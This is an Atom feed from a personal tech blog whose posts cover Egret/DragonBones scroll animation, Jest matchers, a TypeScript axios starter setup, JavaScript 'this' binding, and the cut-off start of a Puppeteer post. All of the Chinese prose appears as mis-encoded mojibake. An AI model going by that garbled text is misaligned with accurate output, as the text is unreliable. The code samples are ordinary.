<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhou shaw</title>
  
  <subtitle>zhou shaw&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoushaw.github.io/"/>
  <updated>2019-05-12T06:27:38.456Z</updated>
  <id>http://zhoushaw.github.io/</id>
  
  <author>
    <name>zhou shaw</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Egretå®æˆ˜-æ¯äº²èŠ‚æ´»åŠ¨</title>
    <link href="http://zhoushaw.github.io/2019/05/06/learning/game/egret%E5%AE%9E%E6%88%98/"/>
    <id>http://zhoushaw.github.io/2019/05/06/learning/game/egretå®æˆ˜/</id>
    <published>2019-05-05T23:42:00.000Z</published>
    <updated>2019-05-12T06:27:38.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|â€”â€” bin-debug   &lt;-ç¼–è¯‘åè¿è¡Œä»£ç </span><br><span class="line">|â€”â€” libs        &lt;-ç¬¬ä¸‰æ–¹åº“</span><br><span class="line">|â€”â€” resource    &lt;-èµ„æºæ–‡ä»¶</span><br><span class="line">    |â€”â€” default.res.json    &lt;-èµ„æºç´¢å¼•ç›®å½•</span><br><span class="line">    â””â”€â”€ default.thm.json    &lt;-ä¸»é¢˜ç´¢å¼•ç›®å½•</span><br><span class="line">|â€”â€” scripts     &lt;-æ„å»ºè„šæœ¬</span><br><span class="line">|â€”â€” resource    &lt;-èµ„æºæ–‡ä»¶</span><br><span class="line">|â€”â€” src         &lt;-é¡¹ç›®æºä»£ç </span><br><span class="line">â””â”€â”€ template    &lt;-é¡¹ç›®æ¨¡æ¿</span><br></pre></td></tr></table></figure><h3 id="ä¸€å±åŠ¨ç”»è®¾è®¡åŸåˆ™"><a href="#ä¸€å±åŠ¨ç”»è®¾è®¡åŸåˆ™" class="headerlink" title="ä¸€å±åŠ¨ç”»è®¾è®¡åŸåˆ™"></a>ä¸€å±åŠ¨ç”»è®¾è®¡åŸåˆ™</h3><ul><li>æ„å»ºä¸€ä¸ªåŸºæœ¬åœºæ™¯éª¨æ¶ï¼Œåç»­éª¨æ¶æ”¾ç½®åŸºæœ¬éª¨æ¶ä¸Šï¼Œæ–¹ä¾¿æ•´ä½“ç§»åŠ¨</li><li>ç‰©ä»¶é€€åœºéœ€è¦ä¸èƒŒæ™¯åæ–¹å‘è¿åŠ¨ï¼Œé€ æˆé”™è½æ„Ÿã€‚æˆ–é¡ºæ–¹å‘é€€åœºï¼Œé¿å…å¯¼è‡´è®¤ä¸ºç‰©å“æˆ–äººä¸èƒŒæ™¯ä¸åˆ†ç¦»</li><li>é¾™éª¨åŠ¨ç”»è®¾è®¡æ—¶ä»¥æœ€å°åå¸§ä¸ºå•ä½ï¼Œåœºæ™¯è½¬æ¢é¢„ç•™30~50å¸§ï¼Œåç»­æ–¹ä¾¿è°ƒæ•´</li><li>å¸§åŠ¨ç”»è®¾è®¡å›¾ç‰‡ä»¥è‡³å°‘ä¸‰å¸§ä¸åŒåŠ¨ç”»ï¼Œå¯ä»¥é€ æˆè¿ç»­æ„Ÿ</li><li>å¼€å§‹é¾™éª¨åŠ¨ç”»åˆ¶ä½œå‰ï¼Œå…ˆç¡®å®šå¥½åœºæ™¯é«˜åº¦å’Œå®½åº¦ä¸ä¼šæœ‰å¤§çš„å˜åŒ–ï¼Œå¦åˆ™åç»­ä¿®æ”¹ä¼šé€ æˆæ•´ä½“è°ƒæ•´</li><li>æ–‡å­—åŠ¨ç”»æ”¾ç½®ç‰©å“å</li><li>åŠ¨ç”»æ•ˆæœæ”¾ç½®980åƒç´ å†…ï¼Œå¦åˆ™åœ¨å°å±å¹•æ‰‹æœºä¸Šæ— æ³•å±•ç¤ºå…¨é¢</li><li>å¸§åŠ¨ç”»åˆ‡æ¢ä¸­é—´è¿‡åº¦è¡”æ¥é€æ˜åº¦å˜åŒ–</li></ul><h2 id="h5æ´»åŠ¨æ„å»ºæ€è·¯"><a href="#h5æ´»åŠ¨æ„å»ºæ€è·¯" class="headerlink" title="h5æ´»åŠ¨æ„å»ºæ€è·¯"></a>h5æ´»åŠ¨æ„å»ºæ€è·¯</h2><p>å¦‚ä½•åˆ¶ä½œä¸€ä¸ªç±»ä¼¼äºä¸­å›½å¥³å­å›¾é‰´çš„é¡¹ç›®å‘¢ã€‚</p><blockquote><p>æ‰«ç è®¿é—®ï¼š</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190506_2dl50cg7c5b79kf58a050fgch92ib_400x400.png"></p><blockquote><p>ä¸»è¦æ€è·¯</p></blockquote><p>é€šè¿‡é¾™éª¨åœºæ™¯åŠ¨ç”»å°†å°†æ‰€æœ‰åŠ¨ç”»åšæˆå¸§åŠ¨ç”»åˆ°é¾™éª¨ä¸­ï¼Œé€šè¿‡æ»‘åŠ¨äº‹ä»¶æ¥æ§åˆ¶å¸§åˆ‡æ¢çš„ä½ç½®ï¼Œå…·ä½“å®ç°ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">const dragonbonesData = RES.getRes( &quot;dragonbones@listen_mother_ske_json&quot; );  </span><br><span class="line">const textureData = RES.getRes( &quot;dragonbones@listen_mother_tex_json&quot; );  </span><br><span class="line">const texture = RES.getRes( &quot;listen_mother_png&quot; );</span><br><span class="line"></span><br><span class="line">let egretFactory: dragonBones.EgretFactory = dragonBones.EgretFactory.factory;</span><br><span class="line">egretFactory.parseDragonBonesData(dragonbonesData);  </span><br><span class="line">egretFactory.parseTextureAtlasData(textureData, texture);</span><br><span class="line"></span><br><span class="line">let armatureDisplay: dragonBones.EgretArmatureDisplay = egretFactory.buildArmatureDisplay(&quot;listen_mother&quot;);</span><br><span class="line"></span><br><span class="line">this.addChild(armatureDisplay);</span><br><span class="line">armatureDisplay.x = 0;</span><br><span class="line">armatureDisplay.y = 0;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">const myScroller = new eui.Scroller();</span><br><span class="line">//æ³¨æ„ä½ç½®å’Œå°ºå¯¸çš„è®¾ç½®æ˜¯åœ¨Scrollerä¸Šé¢ï¼Œè€Œä¸æ˜¯å®¹å™¨ä¸Šé¢</span><br><span class="line">   </span><br><span class="line">const group = new eui.Group();</span><br><span class="line">const img = new eui.Image(&quot;bg_png&quot;);</span><br><span class="line">group.addChild(img);</span><br><span class="line">img.height = this.stage.stageHeight * 2;</span><br><span class="line">   </span><br><span class="line">myScroller.width = this.stage.stageWidth;</span><br><span class="line">myScroller.height = this.stage.stageHeight;</span><br><span class="line">myScroller.viewport = group;</span><br><span class="line">myScroller.bounces = false;</span><br><span class="line">this.addChild(myScroller);   </span><br><span class="line">myScroller.addEventListener(</span><br><span class="line">  egret.Event.CHANGE, </span><br><span class="line">  () =&gt; &#123;</span><br><span class="line">      let scrollRate = myScroller.viewport.scrollV/(img.height - this.stage.stageHeight);</span><br><span class="line">     </span><br><span class="line">      console.log(myScroller.viewport.scrollV,scrollRate);</span><br><span class="line">      armatureDisplay.animation.gotoAndStopByFrame (&apos;newAnimation&apos;,scrollRate*80);</span><br><span class="line">  &#125;,</span><br><span class="line">  this</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½æµç¨‹ï¼š</p><ul><li>è·å–é¾™éª¨èµ„æºã€å¹¶åˆ›å»º<code>dragonBones</code>å®ä¾‹å¯¹è±¡</li><li>å°†é¾™éª¨åœºæ™¯å¯¹è±¡æ·»åŠ è‡³ç”»å¸ƒ</li><li>åˆ›å»º<code>Image</code>å¯¹è±¡ï¼Œè®¾ç½®å®½åº¦è®¾ç½®ä¸ºè§†çª—å®½åº¦ï¼Œé«˜åº¦è®¾ç½®ä¸º<strong>é¾™éª¨åœºæ™¯é«˜åº¦+è§†çª—é«˜åº¦</strong>å¹¶æ·»åŠ è‡³åœºæ™¯ä¸­</li><li>åˆ›å»º<code>scroll</code>å¯¹è±¡ï¼Œå°†å…¶è®¾ç½®ä¸ºè§†çª—å¤§å°ï¼Œè®¾ç½®<code>Image</code>å¯¹è±¡ä¸º<code>scroll</code>çš„è§†åŸŸç»„ä»¶ç»„ä»¶</li><li>ä½¿ç”¨<code>scroll</code>ç›‘å¬æ»šåŠ¨é«˜åº¦ï¼Œè®¡ç®—å½“å‰æ»šåŠ¨æ¡å æ€»å¯æ»šåŠ¨é«˜åº¦çš„ç™¾åˆ†æ¯”=â€œå·²æ»šåŠ¨é«˜åº¦/(å›¾ç‰‡é«˜åº¦-è§†çª—é«˜åº¦)â€</li><li>è·å–<code>dragonBones</code>åœºæ™¯ä¸€å…±æ‹¥æœ‰å¤šå°‘å¸§ï¼Œé€šè¿‡æ€»å¸§æ•°*å½“å‰ç™¾åˆ†æ¯”ï¼Œå¾—åˆ°ç”¨æˆ·æ»‘åŠ¨åˆ°å½“å‰æ‰€åœ¨å¸§æ•°</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç›®å½•ç»“æ„&quot;&gt;&lt;a href=&quot;#ç›®å½•ç»“æ„&quot; class=&quot;headerlink&quot; title=&quot;ç›®å½•ç»“æ„&quot;&gt;&lt;/a&gt;ç›®å½•ç»“æ„&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
      <category term="game" scheme="http://zhoushaw.github.io/categories/game/"/>
    
    
      <category term="egret" scheme="http://zhoushaw.github.io/tags/egret/"/>
    
  </entry>
  
  <entry>
    <title>Jest</title>
    <link href="http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/"/>
    <id>http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/</id>
    <published>2019-05-04T03:01:35.000Z</published>
    <updated>2019-05-12T06:26:35.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·æ­¥"><a href="#èµ·æ­¥" class="headerlink" title="èµ·æ­¥"></a>èµ·æ­¥</h2><blockquote><p>å®‰è£…</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev jest</span><br></pre></td></tr></table></figure><blockquote><p><code>pageckage.json</code>é…ç½®</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;jest&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p><code>Expect</code>æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ¥æ”¶<code>value</code>,åé¢å¯æ¥é“¾å¼å±æ€§åˆ¤æ–­</p><ul><li><code>expect(value)</code><ul><li><code>expect(value).not.toEqual</code>: ä¸åé¢ç­‰å¼å–åæ¯”è¾ƒ</li><li><code>toEqual(compareValue)</code>: <code>value</code> ä¸ <code>compareValue</code>å¿…é¡»å®Œå…¨ç›¸ç­‰</li></ul></li></ul><blockquote><p>è‡ªå®šä¹‰æ ¡éªŒæ–¹æ³•</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// æŸ¥è¯¢å¯¹è±¡keyå€¼æ˜¯å¦å­˜åœ¨å¯¹è±¡ä¸­</span><br><span class="line">expect.extend(&#123;</span><br><span class="line">    toContainKeys(received, keys) &#123;</span><br><span class="line">        const receivedKeys = Object.keys(received);</span><br><span class="line">        const pass = keys.every((val =&gt; receivedKeys.includes(val)));</span><br><span class="line">        if (pass) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: true,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; don&apos;t have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: false,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;èµ·æ­¥&quot;&gt;&lt;a href=&quot;#èµ·æ­¥&quot; class=&quot;headerlink&quot; title=&quot;èµ·æ­¥&quot;&gt;&lt;/a&gt;èµ·æ­¥&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å®‰è£…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>axiosè®¾è®¡</title>
    <link href="http://zhoushaw.github.io/2019/04/28/learning/font-end/js/axios/"/>
    <id>http://zhoushaw.github.io/2019/04/28/learning/font-end/js/axios/</id>
    <published>2019-04-28T00:45:35.000Z</published>
    <updated>2019-05-09T15:24:30.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¡¹ç›®åˆå§‹åŒ–"><a href="#é¡¹ç›®åˆå§‹åŒ–" class="headerlink" title="é¡¹ç›®åˆå§‹åŒ–"></a>é¡¹ç›®åˆå§‹åŒ–</h2><p><a href="https://github.com/zhoushaw/axios" target="_blank" rel="noopener">axios-tsé¡¹ç›®åœ°å€</a></p><p>ä½¿ç”¨ç°æœ‰çš„<code>tsè„šæ‰‹æ¶</code>: <strong>typescript-library-starter</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/alexjoverm/typescript-library-starter.git ts-axios</span><br><span class="line">cd ts-axios</span><br><span class="line"></span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h2 id="ä¼˜ç§€å·¥å…·é›†æˆ"><a href="#ä¼˜ç§€å·¥å…·é›†æˆ" class="headerlink" title="ä¼˜ç§€å·¥å…·é›†æˆ"></a>ä¼˜ç§€å·¥å…·é›†æˆ</h2><p><code>typescript-library-starter</code>ä¸­é›†æˆäº†ä¸€ä¸ªå®Œæ•´åŒ…å¼€å‘çš„æ’ä»¶åŒ…</p><ul><li><a href="https://rollupjs.org/" target="_blank" rel="noopener">RollupJS</a> å¸®åŠ©æˆ‘ä»¬æ‰“åŒ…ã€‚</li><li><a href="https://github.com/prettier/prettier" target="_blank" rel="noopener">Prettier</a> å’Œ <a href="https://palantir.github.io/tslint/" target="_blank" rel="noopener">TSLint</a> å¸®åŠ©æˆ‘ä»¬æ ¼å¼åŒ–ä»£ç ä»¥åŠä¿è¯ä»£ç é£æ ¼ä¸€è‡´æ€§ã€‚</li><li><a href="https://typedoc.org/" target="_blank" rel="noopener">TypeDoc</a> å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£å¹¶éƒ¨ç½²åˆ° GitHub pagesã€‚</li><li><a href="https://jestjs.io/" target="_blank" rel="noopener">Jest</a>å¸®åŠ©æˆ‘ä»¬åšå•å…ƒæµ‹è¯•ã€‚</li><li><a href="https://github.com/commitizen/cz-cli" target="_blank" rel="noopener">Commitizen</a>å¸®åŠ©æˆ‘ä»¬ç”Ÿæˆè§„èŒƒåŒ–çš„æäº¤æ³¨é‡Šã€‚</li><li><a href="https://github.com/semantic-release/semantic-release" target="_blank" rel="noopener">Semantic release</a>å¸®åŠ©æˆ‘ä»¬ç®¡ç†ç‰ˆæœ¬å’Œå‘å¸ƒã€‚</li><li><a href="https://github.com/typicode/husky" target="_blank" rel="noopener">husky</a>å¸®åŠ©æˆ‘ä»¬æ›´ç®€å•åœ°ä½¿ç”¨ git hooksã€‚</li><li><a href="https://github.com/conventional-changelog/conventional-changelog" target="_blank" rel="noopener">Conventional changelog</a>å¸®åŠ©æˆ‘ä»¬é€šè¿‡ä»£ç æäº¤ä¿¡æ¯è‡ªåŠ¨ç”Ÿæˆ change logã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;é¡¹ç›®åˆå§‹åŒ–&quot;&gt;&lt;a href=&quot;#é¡¹ç›®åˆå§‹åŒ–&quot; class=&quot;headerlink&quot; title=&quot;é¡¹ç›®åˆå§‹åŒ–&quot;&gt;&lt;/a&gt;é¡¹ç›®åˆå§‹åŒ–&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/zhoushaw/axios&quot; target=&quot;_blank
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScriptç³»åˆ—ä¹‹this</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/</id>
    <published>2019-04-23T02:22:35.000Z</published>
    <updated>2019-04-27T13:21:01.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨JavaScriptè¯­è¨€ä¸­å­˜åœ¨ä¸€ä¸ª<code>this</code>å…³é”®è¯ï¼Œè¿™ä¸ªå…³é”®è¯æŒ‡çš„æ˜¯å‡½æ•°è¿è¡Œæ—¶æ‰€åœ¨çš„ç¯å¢ƒã€‚ç”±äºå‡½æ•°å¯ä»¥åœ¨ä¸åŒçš„è¿è¡Œç¯å¢ƒæ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸€ç§æœºåˆ¶ï¼Œèƒ½å¤Ÿåœ¨å‡½æ•°ä½“å†…éƒ¨è·å¾—å½“å‰çš„è¿è¡Œç¯å¢ƒï¼ˆ<strong>context</strong>ï¼‰ã€‚æ‰€ä»¥ï¼Œ<code>this</code>å°±å‡ºç°äº†ï¼Œå®ƒçš„è®¾è®¡ç›®çš„å°±æ˜¯åœ¨å‡½æ•°ä½“å†…éƒ¨ï¼ŒæŒ‡ä»£å‡½æ•°å½“å‰çš„è¿è¡Œç¯å¢ƒã€‚</p><p>å‰ä¸€ä¸ªç³»åˆ—çš„<strong>ä½œç”¨åŸŸ</strong>è®²è¿‡,ä½œç”¨åŸŸè¿ç”¨çš„æ˜¯è¯æ³•ä½œç”¨åŸŸï¼Œæ„å‘³ç€æ˜¯ç¼–å†™æ—¶ç¡®å®šçš„ï¼Œä½†<strong>this</strong>ä¸å…¶å·¥ä½œåŸç†å®Œå…¨ä¸åŒï¼Œå®ƒçš„æŒ‡å‘å¹¶ä¸æ˜¯ç¼–å†™æ—¶ç¡®å®šçš„ï¼Œè€Œæ˜¯è¿è¡Œæ—¶ç¡®å®šã€‚</p><h2 id="ä»…ä»…æ˜¯â€œè§„åˆ™â€"><a href="#ä»…ä»…æ˜¯â€œè§„åˆ™â€" class="headerlink" title="ä»…ä»…æ˜¯â€œè§„åˆ™â€"></a>ä»…ä»…æ˜¯â€œè§„åˆ™â€</h2><p>ä¹‹å‰åœ¨é˜…è¯» You Donâ€™t Know JSç³»åˆ—çš„: <strong>this &amp; Object Prototypes</strong>ä¸­ï¼Œå°†thisçš„æŒ‡å‘æ€»ç»“äº†å‡ æ¡è§„åˆ™ï¼š</p><blockquote><p>å‡½æ•°è°ƒç”¨æ–¹å¼ä¸å†…éƒ¨<code>this</code>æŒ‡é’ˆå…³ç³»ï¼š</p></blockquote><ol><li>ç›´æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨<code>this</code>æŒ‡å‘å…¨å±€å¯¹è±¡<code>window</code></li><li>é€šè¿‡å¯¹è±¡ä½¿ç”¨ç‚¹æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨thisæŒ‡å‘è°ƒç”¨å¯¹è±¡</li><li>è§¦å‘äº‹ä»¶è°ƒç”¨å‡½æ•°:å‡½æ•°å†…éƒ¨çš„<code>this</code>æŒ‡å‘è§¦å‘äº‹ä»¶çš„å¯¹è±¡</li><li>ä»¥<code>new</code>çš„æ–¹å¼æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨<code>this</code>æŒ‡å‘æœ¬æ¬¡å‡½æ•°æ‰§è¡Œæ—¶å¯¹åº”çš„ä¸€ä¸ªåŒ¿åå¯¹è±¡ï¼ˆä»¥newçš„æ–¹å¼åˆ›å»ºçš„å‡½æ•°ï¼Œå‡½æ•°åçš„é¦–å­—æ¯ä¸€èˆ¬ä»¥å¤§å†™å­—æ¯å¼€å§‹ï¼‰</li><li>é€šè¿‡<code>call</code>çš„æ–¹æ³•æ¥é—´æ¥è°ƒç”¨æ–¹æ³•:å‡½æ•°å†…éƒ¨thisæŒ‡å‘<code>call</code>æ–¹æ³•çš„ç¬¬ä¸€å‚æ•°å¯¹è±¡,æˆ‘ä»¬å¯ä»¥åˆ›å»ºç»“æ„ç›¸åŒï¼Œä½†å†…å®¹ä¸åŒçš„å¯¹è±¡</li></ol><h2 id="ä¸ä»…ä»…æ˜¯â€œè§„åˆ™â€"><a href="#ä¸ä»…ä»…æ˜¯â€œè§„åˆ™â€" class="headerlink" title="ä¸ä»…ä»…æ˜¯â€œè§„åˆ™â€"></a>ä¸ä»…ä»…æ˜¯â€œè§„åˆ™â€</h2><p>å‚è€ƒäº†ä¸Šé¢çš„è§„åˆ™å‘ç°ï¼Œ<code>this</code>çš„æŒ‡å‘æ— è®ºå¦‚ä½•éƒ½é€ƒè„±ä¸äº†ä¸Šé¢çš„<strong>5å¤§åŸåˆ™</strong>,é‚£å®ƒä»¬ä¹‹å‰æ˜¯å¦å­˜åœ¨ä¸€å®šçš„è§„å¾‹å‘¢ï¼Œæˆ–è€…è¯´æ˜¯ä»€ä¹ˆæ¥å†³å®š<code>this</code>çš„æŒ‡å‘çš„ã€‚</p><p>é€šå¸¸æˆ‘ä»¬ä¼šå¯¹ä¸€ä¸‹ä¾‹å­çš„ç»“æœæ²¡æ³•å‡†ç¡®çš„ç¡®å®š<code>this</code>æŒ‡å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &apos;zhou&apos;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    say: function () &#123;</span><br><span class="line">        console.log(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say();  </span><br><span class="line"></span><br><span class="line">var say = obj.say;</span><br><span class="line">say();</span><br></pre></td></tr></table></figure><blockquote><p>ä¸Šé¢çš„è¾“å‡ºç»“æœä¼šæ˜¯ä»€ä¹ˆå‘¢ï¼š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.say(); // è¾“å‡ºshaw</span><br><span class="line">say();  // è¾“å‡ºzhou</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™é‡Œ<code>obj.say</code>å’Œ<code>say</code>çš„è¾“å‡ºç»“æœä¼šä¸ä¸€è‡´å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬æ¥ä¸€æ¢ç©¶ç«Ÿã€‚</p><p><code>this</code>çš„æŒ‡å‘ä¸æ•°æ®åœ¨å†…å­˜é‡Œçš„æ•°æ®ç»“æ„æœ‰å…³:</p><p>ä¸Šé¢æ¡ˆä¾‹é‡Œçš„<code>obj</code>å¯¹è±¡æ˜¯å¦‚ä½•åœ¨å†…å­˜ä¸­å­˜å‚¨çš„å‘¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.say-&gt; &#123;</span><br><span class="line">    [[value]]: sayå‡½æ•°åœ°å€</span><br><span class="line">    [[write]]: true,</span><br><span class="line">    [[readable]]: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Š<code>say</code>å‡½æ•°å¹¶æ²¡æœ‰å­˜å‚¨åœ¨<code>obj</code>å¯¹è±¡ä¸­ï¼Œå®ƒåªå­˜å‚¨äº†<code>say</code>å‡½æ•°çš„åœ°å€ã€‚</p><p>æˆ‘ä»¬ç›´æ¥é€šè¿‡<code>obj.say</code>æ¥è°ƒç”¨å‡½æ•°ï¼Œä¸<code>obj.say</code>èµ‹å€¼ç»™<code>say</code>å˜é‡è°ƒç”¨å®Œå…¨ä¸åŒï¼Œå› ä¸º<code>obj</code>ä¸­å­˜å‚¨çš„æ˜¯<code>sayå‡½æ•°</code>çš„åœ°å€ï¼Œæˆ‘ä»¬è¿›è¡Œèµ‹å€¼æ“ä½œæ—¶ç›´æ¥å°†sayå‡½æ•°åœ°å€ç›´æ¥èµ‹å€¼è¿‡å»äº†ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æƒ³è±¡çš„å°†<code>obj.say</code>å¼•ç”¨èµ‹å€¼è¿‡å»ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨JavaScriptè¯­è¨€ä¸­å­˜åœ¨ä¸€ä¸ª&lt;code&gt;this&lt;/code&gt;å…³é”®è¯ï¼Œè¿™ä¸ªå…³é”®è¯æŒ‡çš„æ˜¯å‡½æ•°è¿è¡Œæ—¶æ‰€åœ¨çš„ç¯å¢ƒã€‚ç”±äºå‡½æ•°å¯ä»¥åœ¨ä¸åŒçš„è¿è¡Œ
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>puppeteerçˆ¬è™«å®æˆ˜</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/</id>
    <published>2019-04-22T20:18:35.000Z</published>
    <updated>2019-05-12T06:26:35.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¾…è¡¥å……â€¦.</p><h2 id="centOs7-0æ— æ³•è¿è¡Œé—®é¢˜"><a href="#centOs7-0æ— æ³•è¿è¡Œé—®é¢˜" class="headerlink" title="centOs7.0æ— æ³•è¿è¡Œé—®é¢˜"></a>centOs7.0æ— æ³•è¿è¡Œé—®é¢˜</h2><p>centoså¿…é¡»å‡çº§åˆ°7.0ä»¥ä¸Šå¦åˆ™ä¼šé‡åˆ°ä¾èµ–ç‰ˆæœ¬ç¼ºå¤±é—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 